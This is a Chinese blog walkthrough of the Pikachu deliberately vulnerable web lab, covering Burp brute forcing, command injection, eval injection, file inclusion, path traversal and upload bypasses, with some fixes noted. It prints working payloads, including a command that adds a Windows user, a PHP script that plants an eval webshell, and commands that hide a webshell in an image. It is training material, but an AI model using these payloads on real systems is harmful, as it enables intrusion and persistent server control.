---
title: Pikachu漏洞平台通关记录(更新中)
author: 简文涛
categories:
  - Web
tags:
  - Web基础漏洞
comments: true
top: false
summary: 开始复习最基础的Web漏洞，查漏补缺，打好基础，我也尽量把文章写得详细一些，希望对刚入门的小白能有一些帮助。
img: 'https://i.loli.net/2020/05/21/jAG68sfaB4RHJMZ.jpg'
abbrlink: 30313
date: 2020-05-21 16:26:33
updated:
permalink:
---
开始复习最基础的Web漏洞，查漏补缺，打好基础，我也尽量把文章写得详细一些，希望对刚入门的小白能有一些帮助。

## Pikachu

### 简介

> Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。

### 安装

项目地址：https://github.com/zhuifengshaonianhanlu/pikachu

1.将下好的项目放置phpStudy的`WWW`目录下

2.然后修改配置文件`/pikachu-master/inc/config.inc.php`，修改成自己的mysql用户名和密码

3.浏览器访问http://127.0.0.1/pikachu-master/，进入主页面

4.点击首页红色字体进行初始化安装

### 乱码解决

如果靶场出现了乱码，我们可以执行以下步骤

1.按"win + R" ，并输入 regedit 进入注册表

2.找到 `HKEY_CURRENT_USER\Console\%SystemRoot%_system32_cmd.exe`，如果该项下已存在 `CodePage` 项，则把值改为十进制 "`65001`"，点击确定即可；如果不存在，在该项下新建一个 DWORD（32位值），命名为 "CodePage"，值设为 "65001"。然后关闭注册表管理器。

## Burte Force（暴力破解）

### 基础知识准备

> 暴力破解(Burte Force)是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。

**Burp各种攻击模式的区别**

1. **Sinper：**一个变量设置一个payload进行攻击
2. **Battering ram：**可以设置两个变量，把payload同时给两个变量
3. **Pitchfork：**两个变量分别设置payload，然后按顺序一一对应进行破解
4. **Cluster bomb：**两个变量分别设置payload，然后交叉列所有情况进行破解（常用） 

### 基于表单的暴力破解

这个还是比较简单的，抓包发送到intruder模块，配置参数开始攻击就可以了，我就懒得写了，大家可以参考这篇文章

参考：[Pikachu暴力破解——基于表单](https://www.cnblogs.com/ApricityJ/p/12628753.html)

### 验证码绕过(on server)

> 验证码可以用来防止恶意注册、防止暴力破解。

**服务端验证码常见问题：**

- 1.验证码设计的太过简单和有规律，容易被猜解
- 2.验证码校验不严格，逻辑出现问题
- 3.验证码在后台不过期，导致长期可以使用

检查验证码元素，发现验证机制来自后端

![](https://i.loli.net/2020/05/22/EuZBhv5RHaNXzJw.png)

那么我们根据这3个常见问题我们来一一验证是否Pikachu靶场满足上面三条中的情况，那我们打开靶场页面吧！

一、观察验证码，验证码是没有规律的，并且也不简单，所以第一条不满足

二、当验证码输入正确、错误和输入为空会是以下3种情况：

| 验证码正确                                             | 验证码错误                                             | 验证码为空                                             |
| ------------------------------------------------------ | ------------------------------------------------------ | ------------------------------------------------------ |
| ![](https://i.loli.net/2020/05/22/vjVWKpezmsNaUG4.png) | ![](https://i.loli.net/2020/05/22/6pZYRdMaGClBQ9E.png) | ![](https://i.loli.net/2020/05/22/zQo9KaXrB6tW7fG.png) |

可以看到服务端对验证码的有效性做过校验,一切逻辑正常，所以第二条也不满足

三、我们随便输入用户名和密码，输入正确验证码进行抓包，发送到repeater模块

| 用户名密码不同，验证码相同| 用户名密码不同，验证码相同 |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| ![](https://i.loli.net/2020/05/22/Sb3FWYldJEZjmqO.png) | ![](https://i.loli.net/2020/05/22/6nFUis8RyW5LwJE.png) |

按理说输入不同的用户，应该报验证错误的提示，但是这里却没有，说明在输入第二个用户时验证码还没有过期，那么第三种情况就满足了

**漏洞分析:**

- 当刷新页面,客户端向服务器发出请求,生出新的验证码；

- 同时后台会在`session`中将这个验证码存下来【目的是为了对用户输入的验证码进行验证)】；

- 所以当输入错误或空的验证码都会提示错误信息,只有正确的验证码才可以被服务器接受；

- 但是如果这个验证码在后台不过期或者过期时间较长,足够我们去爆破用户名密码,那么漏洞就产生了。

其漏洞根本在于服务器端未设定生出验证码的session的过期时间,那么按照PHP语言默认session的过期时间为24分钟,这个验证码24分钟内都是有效的,那么也足够黑客进行暴力破解啦

那我们就来利用一下这个漏洞吧，将刚才的包发送到intruder模块

1.设置爆破位置及攻击方式

![](https://i.loli.net/2020/05/22/amki1dFVAYKntTS.png)

2.设置payloads，这里为了快速爆破出，我添加了包含正确用户名密码的5个用户，毕竟掌握方法才是最重要的啦

| payload1                                          | payload2                                               |
| ------------------------------------------------------ | ------------------------------------------------------ |
| ![](https://i.loli.net/2020/05/22/2PGq6DNpni9tbS8.png) | ![](https://i.loli.net/2020/05/22/ZPifDKv4Th65r71.png) |

3.点击开始攻击，根据响应长度就可以判断出正确的用户名和密码了

![](https://i.loli.net/2020/05/22/PBQmaFJE7g9Dvzn.png)

**修复方法:**

方法一：在php.ini配置文件中设置过期时间
方法二：在代码中设定该验证码验证过一次之后,就将其session进行销毁(更有效)

### 验证码绕过(on client)

**客户端验证码常见问题:**

- 1.使用前端js实现验证码(纸老虎)
- 2.将验证码在cookie中泄露,容易被获取
- 3.将验证码在前端源代码中泄露,容易被获取

检查验证码元素，发现验证机制来自前端JS

![](https://i.loli.net/2020/05/22/B1sD6CkFEt4qPab.png)

既然验证来自前端JS,那我们我们可以在burp suite不输入验证码或者输入错的验证码完成爆破

| 输错的验证码                                           | 不输验证码                                             |
| ------------------------------------------------------ | ------------------------------------------------------ |
| ![](https://i.loli.net/2020/05/22/fIwRYyGhTumvqox.png) | ![](https://i.loli.net/2020/05/22/GjPi9OX3pEf265k.png) |

可以发现不输入验证码或者输入错的验证码对返回结果并没有影响，说明确实验证来自前端

那我们就来利用一下这个漏洞吧，将包发送到intruder模块,后面步骤跟on server的操作是一样的

1.设置爆破位置及攻击方式

![](https://i.loli.net/2020/05/22/OClQvRkHgIXmNK7.png)

2.设置payloads，这里为了快速爆破出，我添加了包含正确用户名密码的5个用户，毕竟掌握方法才是最重要的啦


| payload1                                          | payload2                                               |
| ------------------------------------------------------ | ------------------------------------------------------ |
| ![](https://i.loli.net/2020/05/22/2PGq6DNpni9tbS8.png) | ![](https://i.loli.net/2020/05/22/ZPifDKv4Th65r71.png) |

3.点击开始攻击，根据响应长度就可以判断出正确的用户名和密码了

![](https://i.loli.net/2020/05/22/PBQmaFJE7g9Dvzn.png)

### token防爆破?

> token是由服务端生成的一串字符串，作为客户端向服务端请求的一个标识。如果前端使用用户名/密码向服务端请求认证，服务端认证成功，那么在服务端会返回 token 给前端。前端可以在每次请求的时候带上 token 证明自己的合法地位。

**token特性**

- token 完全由应用管理，所以它可以避开同源策略

- token防止重复提交和CSRF

- token 可以是无状态的，可以在多个服务间共享
- token无法防止暴力破解

检查元素，发现页面不仅提交username和password，还提交了一个hidden属性的token值

![](https://i.loli.net/2020/05/22/MWVjwsz1ALdQCDu.png)

既然token是无法防止爆破的，那么我们就来爆破试试吧，抓包发送到intruder模块，因为最多只能爆破2个参数，所以要知道用户名才行。

1.设置爆破位置及攻击方式

![](https://i.loli.net/2020/05/22/nPjMAL1toQ5Rubi.png)

2.设置token正则表达式。

在`Options`中的`Grep-Extract`中打勾，点击`add`添加过滤条件 点击`refetch response`找到响应包中的token 之选中，再点击`OK`

![](https://i.loli.net/2020/05/22/2seXrV4KSmHpZPG.png)

在`Options`中将线程设置为`1`，对于每一个包返回来的token值都是不一样的，所以我们只能选择单线程进行攻击

将最下方的`Redirections`选择为`Always`，如果不点上这个就不会打开html包的body部分，因为token值是存储在body的hidden部分，那么也就不会自动获取token值，我们也就不能绕过它进行暴力破解了

| 线程设置                                               | 重定向设置                                             |
| ------------------------------------------------------ | ------------------------------------------------------ |
| ![](https://i.loli.net/2020/05/22/er9q8gfSTU7Qix1.png) | ![](https://i.loli.net/2020/05/22/T7c9YugmfLiStU3.png) |

3.设置payloads。这里为了快速爆破出，密码payload我设置了包含正确密码的5个条目

| payload1                                               | payload2                                               |
| ------------------------------------------------------ | ------------------------------------------------------ |
| ![](https://i.loli.net/2020/05/22/v2uym4JE7XtFCzL.png) | ![](https://i.loli.net/2020/05/22/9JSiA4MEtCx1TdB.png) |

4.点击开始攻击，根据响应长度就可以判断出正确密码了

![](https://i.loli.net/2020/05/22/wecp5GFiQRSa9BM.png)

## RCE（远程代码执行）

### 基础知识准备

> RCE(Remote Command/Code Execute)，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。

#### 命令拼接符

##### windows

1. `“|”` 管道符，前面命令标准输出，后面命令的标准输入
2. `“&”` commandA & commandB 先运行命令A然后运行命令B
3. `“||”` commandA || commandB 运行命令A，如果失败则运行命令B
4. `“&&”` commandA && commandB 运行命令A，如果成功则运行命令B

##### linux

1. `“|”` 管道符，前面命令标准输出，后面命令的标准输入
2. `“&”` commandA & commandB 先运行命令A然后运行命令B
3. `“||”` commandA || commandB 运行命令A，如果失败则运行命令B
4. `“&&”` commandA && commandB 运行命令A，如果成功则运行命令B
5. `“;”` commandA;commandB执行完A执行B
6. `“%0a”` 换行符
7. `“%0d”` 回车符

#### 命令执行函数

在PHP中，可以执行命令的函数有：

`system、exec、shell_exec、passthru、pcntl_exec、popen、proc_popen等`

### exec "ping"

**源码分析**：

```php
if(isset($_POST['submit']) && $_POST['ipaddress']!=null){
    $ip=$_POST['ipaddress'];
    if(stristr(php_uname('s'), 'windows')){
        $result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理
    }else {
        $result.=shell_exec('ping -c 4 '.$ip);
    }
}
```

可以看到执行`shell_exec()`函数时是直接拼接的`$ip`变量，那我们可以直接拼接恶意命令进行执行。

因为是Windows环境，所以只能执行Windows下的命令

**Payload:**

```
127.0.0.1 | dir
127.0.0.1 & dir
127.0.0.1 || dir
127.0.0.1 && dir
127.0.0.1 & ipconfig
127.0.0.1 | net user hack 123 /add #添加用户
```

![](https://i.loli.net/2020/05/21/zOi6W3aQoCvgPj5.png)

### exec "eval"

**源码分析**：

```php
if(isset($_POST['submit']) && $_POST['txt'] != null){
    if(@!eval($_POST['txt'])){
        $html.="<p>你喜欢的字符还挺奇怪的!</p>";
```

提交内容进入了 `@!eval`中 如果不报错就执行,报错就会输出一句话

**Payload:**

```
phpinfo();
system("dir");
system("ipconfig");
system("whoami");
```

![](https://i.loli.net/2020/05/21/FeypcaCuTHD47os.png)

## File Inclusion（文件包含漏洞）

### 简介

> `File Inclusion`(文件包含漏洞)，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：
> `include(),include_once(),require(),require_once()`,这些文件包含函数在代码设计中被经常使用到。

​	大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 

### 文件包含函数

#### **include( )**

当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含
进来，发生错误时之给出一个警告，继续向下执行。

#### **include_once( )**

功能与 Include()相同，区别在于当重复调用同一文件时，程序只调用一次

#### **require( )**

require()与 include()的区别在于require()执行如果发生错误，函数会输出
错误信息，并终止脚本的运行。

#### **require_once( )**

功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次。

### Local

> **本地文件包含漏洞：**仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。

**源码分析**：

```php
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    include "include/$filename";
}
```

`$_GET['filename']`参数开发者没有经过严格的过滤，直接带入了`include`的函数，攻击者可以修改`filename`的值，执行非预期的操作。

**安全的写法:**

使用白名单，严格指定包含的文件名

```php
if($filename=='file1.php' || $filename=='file2.php' || $filename=='file3.php' || 			$filename=='file4.php' || $filename=='file5.php'){
         include "include/$filename";
}
```

打开平台，选择一个选项,可以看到上传了一个文件名到后台，后台打开包含的指定目标文件

```
http://127.0.0.1/pikachu-master/vul/fileinclude/fi_local.php?filename=file1.php&submit=%E6%8F%90%E4%BA%A4
```

Linux 或Windows，我们都可以使用 `“../”` 的方式进行目录穿越，读取其他目录下的文件

**payload**

```
?filename=../../../../Windows/System32/drivers/etc/hosts       #读取本地域名解析文件
```

![](https://i.loli.net/2020/05/21/aWlPwkITdbYUGJE.png)

### Rrmote

> **远程文件包含漏洞：**能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。

`注意：`远程包含漏洞的前提：如果使用的incldue和require，则需要在phpStudy或php.ini中配置开启下面选项

```ini
allow_url_fopen=on //默认打开
allow_url_include=on //默认关闭
```

**源码分析**：

```php
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    include "$filename";
}
```

跟上面本地代码一样，变量传进来直接包含,没做任何的安全限制

打开平台，选择一个选项。同样是通过传递一个文件名进行包含的

```
http://127.0.0.1/pikachu-master/vul/fileinclude/fi_remote.php?filename=include%2Ffile1.php&submit=%E6%8F%90%E4%BA%A4
```

因为这个限制只能读取txt文件,这里txt会被解析成php执行，所以我们写一个`yijuhua.txt`文件执行过后让他自己生成木马

```php
<?php
$myfile = fopen("yijuhua.php", "w");
$txt = '<?php @eval($_POST['x']);?>';
fwrite($myfile, $txt);
fclose($myfile);
?>
```

**payload:**

```
?filename=http://127.0.0.1/pikachu-master/test/yijuhua.txt
```

![](https://i.loli.net/2020/05/21/p5ETxhGDOWcMXeN.png)

运行之后果然产生了一句话木马文件

用蚁剑进行连接

![](https://i.loli.net/2020/05/21/7MJ6t2aYUDkb9Bz.png)

连接成功

![](https://i.loli.net/2020/05/21/2eIfGw4lEKFzMq1.png)

## unsafe filedownload

>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。
此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。

提示说点击球员名字即可下载头像图片

点击科比的会直接下载，右键点击，选择复制链接，得到如下链接

```Payload
http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=kb.png
```

可以看到是直接通过filename进行读取文件的，那我们来尝试下载在上一页面URL中发现的`down_nba.php`

```Payload
http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=../down_nba.php
```

果然成功下载，当然还可以通过`../../`来构造下载其他文件

**防范措施：**　　　　　　　　　　　　　　　　　　

1.对传入的文件名进行严格的过滤和限定

2.对文件下载的目录进行严格的限定

##  unsafe upfileupload

> 文件上传功能在web应用系统很常见，当用户点击上传按钮后，后台会对上传的文件进行判断,比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。

### client check

界面提示`这里只允许上传图片o！`，上传php文件会`弹框`提示`上传的文件不符合要求，请重新选择！`

F12检查元素,发现是通过JS进行check的，这样就很容易绕过了

```html
<input class="uploadfile" type="file" name="uploadfile" onchange="checkFileExt(this.value)">
```

找到check的JS代码，只对后缀名做了校验

```javascript
function checkFileExt(filename)
{
    var flag = false; //状态
    var arr = ["jpg","png","gif"];
    //取出上传文件的扩展名
    var index = filename.lastIndexOf(".");
    var ext = filename.substr(index+1);
    //比较
    for(var i=0;i<arr.length;i++)
    {
        if(ext == arr[i])
        {
            flag = true; //一旦找到合适的，立即退出循环
            break;
        }
    }
    //条件判断
    if(!flag)
    {
        alert("上传的文件不符合要求，请重新选择！");
        location.reload(true);
    }
}
```

**绕过方法一：**

修改`JS`，直接将`php`后缀名加上，在控制台运行，然后就可以成功上传php文件了

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200529092420.png)1



上传一个 info.php 内容如下：

```php
<?php phpinfo();?>
```

![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200529092714193.png)

获取到上传路径后直接访问看看

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200529092857.png)

**绕过方法二：**

将info.php后缀改为png，然后上传，利用BP进行拦截，然后将png改为php重新发包

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200529093908.png)



### MIME check

> **MIME（Multipurpose Internet Mail Extensions）多用途互连网右键扩展类型**。
>
> 当一个浏览器对一个文件进行识别的时候，他会给文件定义一个类型，放在http的头部的Content-type里面，比如上传图片，就会自动识别是jpg或者png等

上传php文件，提示只能上传图片。

![image-20200529094657321](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200529094736.png)

根据提示看，应该只进行了 Content-Type 类型校验，可以通过修改`MIME`类型来绕过，我们正常上传 php 文件，然后直接将其文件类型修改为 `image/png`

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200529095523.png)

然后就可以成功上传了

### getimagesize

getimagesize 函数会检测文件是否是图片，所以得通过制作图马来绕过这个函数检测。

**图片马制作**

- Windows 下 图马制作

**方法一：**
我们需要一张图片`1.jpg `和一句话木马写好的php文件`1.php` 
将1.jpg和1.php放到同一目录下,
然后在该目录下用cmd执行命令`copy 1.jpg/b + 1.php/a 2.jpg `
新生成的2.jpg就是我们制作好的图片马
![](https://i.loli.net/2019/07/13/5d295bd449c1993400.png)
**方法二**：
HxD打开一张图片`1.jpg`
![](https://i.loli.net/2019/07/13/5d295be59cb6829409.png)
在图片末尾加上一句话木马，保存得到的图片就是图片马了
![](https://i.loli.net/2019/07/13/5d295c7214fb631104.png)

- Linux 下 图马制作

```bash
#方法1 将shell.php内容追加到muma.png
cat shell.php >> muma.png

#方法2 png+php合成png图马
cat a.png shell.php >> muma.png

#方法3 直接使用echo追加到png中
echo '<?php phpinfo();?>' >> muma.png
```

将制作好的图片马上传

![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200529110623157.png)

但是服务器将木马文件解析成了图片文件，因此向其发送执行该文件的请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。我们需要利用前面的`文件包含漏洞`可以将图片格式的文件当做php文件来解析执行

```
http://127.0.0.1/pikachu-master/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2020/05/29/6589365ed07a93cc13b725773978.jpg&submit=%E6%8F%90%E4%BA%A4
```

![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200529110401162.png)



### 文件上传漏洞防范

- 验证文件类型、后缀名、大小;
- 验证文件的上传方式;
- 对上传的文件进行一定复杂的重命名;
- 不要暴露文件上传后的路径;

##  over permission（越权）

 

## Directory Traversal（目录遍历）

## 赞助💰

如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭

<table>
  <tbody>
     <tr>
         <td style="text-align:center;">支付宝支付</td>
         <td style="text-align:center;">微信支付</td>
     </tr>
   <tr>
    <td style="text-align:center;" ><img width="200" src="https://jwt1399.top/medias/reward/alipay.png"></td>    
      <td style="text-align:center;"><img width="200" src="https://jwt1399.top/medias/reward/wechat.png"></td>     
  </tr>
</tbody></table>